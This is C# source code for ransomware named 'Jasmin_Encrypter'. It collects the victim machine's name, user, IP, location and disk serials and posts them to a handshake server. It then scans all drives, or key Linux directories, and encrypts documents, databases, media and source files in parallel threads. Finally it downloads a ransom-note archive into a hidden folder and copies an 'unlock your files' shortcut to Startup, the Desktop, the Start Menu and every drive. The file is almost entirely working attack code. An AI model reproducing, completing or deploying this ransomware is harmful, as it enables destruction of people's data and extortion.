using System;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net;
using System.Security.Cryptography;
using SharpCompress.Common;
using SharpCompress.Readers;
using System.Diagnostics;
using System.Management;
using IpInfo;

namespace Jasmin_Encrypter
{
    class Program
    {
        public static string hostaddr     = "http://127.0.0.1/handshake.php";
        public static string AlertMsgLink = "http://127.0.0.1/alertmsg.zip";
        public static string AlertMsgPath = "C:\\Users\\Public\\Windows\\Ui\\";
        public static string AlertMsgFile = AlertMsgPath + "alertmsg.zip";
        public static string systemid     = "";

        static void Main(string[] args)
        {
            systemid = GenerateSystemId();
            CheckConnection();
            MakeConnection();
            RetriveFiles();
            AlertingUser();
            Console.ReadKey();

            string GenerateSystemId()
            {
                ManagementClass mc = new ManagementClass("Win32_LogicalDisk");
                ManagementObjectCollection col = mc.GetInstances();
                string result = "";
                foreach (ManagementObject o in col)
                    result += Convert.ToString(o["VolumeSerialNumber"]);
                return result;
            }

            bool CheckConnection()
            {
                while (true)
                {
                    try
                    {
                        var s = new Ping().Send("www.google.com").Status;
                        if (s == IPStatus.Success) return true;
                        else return false;
                    }
                    catch { Thread.Sleep(2000); }
                }
            }

            void MakeConnection()
            {
                try
                {
                    string username = Environment.UserName;
                    string machine  = Environment.MachineName;
                    string time = DateTime.Now.ToString("HH:mm:ss");
                    string date = DateTime.Today.ToString("dd/MM/yyyy") + ", " + DateTime.Now.DayOfWeek;
                    string ip = new WebClient().DownloadString("https://api.ipify.org");
                    var client = new HttpClient();

                    string GetLocation()
                    {
                        var api = new IpInfoApi(client);
                        var rep = api.GetCurrentCityAsync();
                        return rep.Result;
                    }

                    // 不再上传密码——密钥由RSA保护，服务端无需存储
                    var pairs = new List<KeyValuePair<string, string>>
                    {
                        new KeyValuePair<string, string>("machine_name", machine),
                        new KeyValuePair<string, string>("computer_user", username),
                        new KeyValuePair<string, string>("systemid", systemid),
                        new KeyValuePair<string, string>("os", "Windows 10"),
                        new KeyValuePair<string, string>("date", date),
                        new KeyValuePair<string, string>("time", time),
                        new KeyValuePair<string, string>("ip", ip),
                        new KeyValuePair<string, string>("location", GetLocation()),
                        new KeyValuePair<string, string>("password", "RSA_PROTECTED"),
                        new KeyValuePair<string, string>("handshake", "jasmin@123"),
                    };
                    var content = new FormUrlEncodedContent(pairs);
                    var response = client.PostAsync(hostaddr, content).Result;
                }
                catch { }
            }

            void RetriveFiles()
            {
                string[] exts = {
                    "*.pptx","*.docx","*.xlsx","*.txt","*.pdf",
                    "*.jpeg","*.jpg","*.png","*.csv","*.ppt",
                    "*.doc","*.xls","*.zip","*.rar","*.7z",
                    "*.mp3","*.mp4","*.avi","*.mov","*.mkv",
                    "*.sql","*.bak","*.mdb","*.accdb",
                    "*.html","*.php","*.java","*.py","*.c",
                    "*.cpp","*.cs","*.json","*.xml","*.yaml",
                };
                bool isWin = Environment.OSVersion.Platform == PlatformID.Win32NT;

                if (isWin)
                    EncryptWindows(exts);
                else
                    EncryptLinux(exts);
            }

            void EncryptWindows(string[] exts)
            {
                // 扫描所有驱动器(含C:)，SkipRules保护系统文件
                foreach (DriveInfo d in DriveInfo.GetDrives())
                {
                    try { ScanDir(d.Name, exts); } catch { }
                }
            }

            void EncryptLinux(string[] exts)
            {
                // 扫描 /home, /root, /var, /opt, /tmp, /srv
                string[] roots = { "/home","/root","/var","/opt","/tmp","/srv" };
                foreach (string r in roots)
                {
                    try { if (Directory.Exists(r)) ScanDir(r, exts); }
                    catch { }
                }
            }

            void ScanDir(string root, string[] exts)
            {
                foreach (string ext in exts)
                {
                    try
                    {
                        foreach (string f in Directory.EnumerateFiles(
                            root, ext, SearchOption.AllDirectories))
                        {
                            try
                            {
                                string fc = f; // closure capture
                                new Thread(() => HybridFileEncryptor.EncryptFile(fc))
                                { Priority = ThreadPriority.AboveNormal }.Start();
                            } catch { }
                        }
                    } catch { }
                }
            }

            bool StartDownload()
            {
                var wc = new WebClient();
                while (true)
                {
                    try
                    {
                        if (Directory.Exists(AlertMsgPath))
                            Directory.Delete(AlertMsgPath, true);
                        Directory.CreateDirectory(AlertMsgPath).Attributes = FileAttributes.System | FileAttributes.Hidden;
                        wc.DownloadFile(AlertMsgLink, AlertMsgFile);
                        Thread.Sleep(450);
                        StartExtraction();
                        return true;
                    }
                    catch (WebException) { Thread.Sleep(2000); }
                }
            }

            bool StartExtraction()
            {
                try
                {
                    if (!File.Exists(AlertMsgFile)) return false;
                    using (Stream s = File.OpenRead(AlertMsgFile))
                    {
                        var reader = ReaderFactory.Open(s);
                        while (reader.MoveToNextEntry())
                            if (!reader.Entry.IsDirectory)
                                reader.WriteEntryToDirectory(AlertMsgPath, new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
                    }
                    return true;
                }
                catch { return false; }
            }

            void AlertingUser()
            {
                string launcher = @"C:\Users\Public\Windows\Ui\unlock your files.lnk";
                string startup  = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\unlock your files.lnk";
                string desktop  = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\unlock your files.lnk";
                string startm   = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\unlock your files.lnk";

                try { StartDownload(); } catch { }
                try { Process.Start(launcher); } catch { }

                foreach (string p in new[] { startup, desktop, startm })
                    try { File.Copy(launcher, p); } catch { }

                foreach (DriveInfo dr in DriveInfo.GetDrives())
                    try { File.Copy(launcher, dr.Name + @"\unlock your files.lnk"); } catch { }

                foreach (string f in Directory.EnumerateFiles(AlertMsgPath, "*.*", SearchOption.AllDirectories))
                    try { File.SetAttributes(f, FileAttributes.Hidden | FileAttributes.System); } catch { }
                foreach (string d in Directory.EnumerateDirectories(AlertMsgPath))
                    try { new DirectoryInfo(d).Attributes = FileAttributes.System | FileAttributes.Hidden; } catch { }
            }

        } // end Main
    } // end Program
} // end namespace
